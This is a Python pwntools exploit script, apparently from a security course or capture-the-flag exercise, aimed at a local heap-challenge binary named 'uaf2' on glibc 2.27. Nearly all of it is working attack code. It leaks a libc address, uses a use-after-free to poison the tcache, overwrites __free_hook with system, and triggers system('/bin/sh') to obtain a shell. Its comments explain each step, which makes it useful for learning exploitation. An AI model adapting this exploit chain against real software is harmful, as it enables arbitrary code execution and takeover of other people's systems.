#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s

elf = ELF('./uaf2')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./uaf2")




## [Glibc 2.27 UAF Attack Roadmap]
## 1. Leak libc address from unsorted bin
## 2. Leverage UAF vulnerability to perform tcachebin attack to free_hook
## 3. Modify free_hook to system




## ---------------------- [Step 1] -------------------------- ##
## Prepare heap chunk for attacking
alloc(0, 0x30)
alloc(1, 0x30)
alloc(2, 0x600)
alloc(3, 0x10)


## Size of chunk_0 and chunk_1 is 0x30, would be placed into tcache bin
## tcache_bin(0x30) --> chunk_1 --> chunk_0
free(0)
free(1)


## First use gdb to check the lowest byte of chunk_2
## Modify fd of chunk_1, let it points to chunk_2 - 0x20
## tcache_bin(0x30) --> chunk_1 --> chunk_2 - 0x20
read(1, '\xc0')


## Take out heap chunk from tcache bin
## chunk_4 == chunk_1
## chunk_5 == chunk_2 - 0x20
alloc(4, 0x30)
alloc(5, 0x30)


## Size of chunk 2 is 0x600, would be placed into unsorted bin 
free(2)


## Since chunk_5 is overlapped with chunk_2, we can leak out its address by chunk_5
read(5, "a" * 0x20)
leak_addr = u64(write(5)[0x20 : 0x26] + "\x00\x00")


## Calculate system and free_hook address
system_addr = leak_addr - 0x39c880
free_hook_addr = leak_addr + 0x1c48






## ---------------------- [Step 2] -------------------------- ##
## Perform UAF by deleting chunk 0 for twice
free(4)
## Size of chunk_4 is 0x30, among size of tcachebin
## tcache_bin(0x30) --> chunk_4


## Edit fd pointer of chunk_4, let it point to free_hook
read(4, p64(free_hook_addr))


## tcache_bin(0x30) --> chunk_4 --> fee_hook
## chunk_ would be overlapped with chunk_4
alloc(6, 0x30)


## tcache_bin(0x30) --> free_hook
## chunk_7 would be overlapped with free_hook
alloc(7, 0x30)






## ---------------------- [Step 3] -------------------------- ##
## Modify free_hook to be system
read(7, p64(system_addr))


## The below operation would be system("/bin/sh")
read(3, "/bin/sh")
free(3)
p.interactive()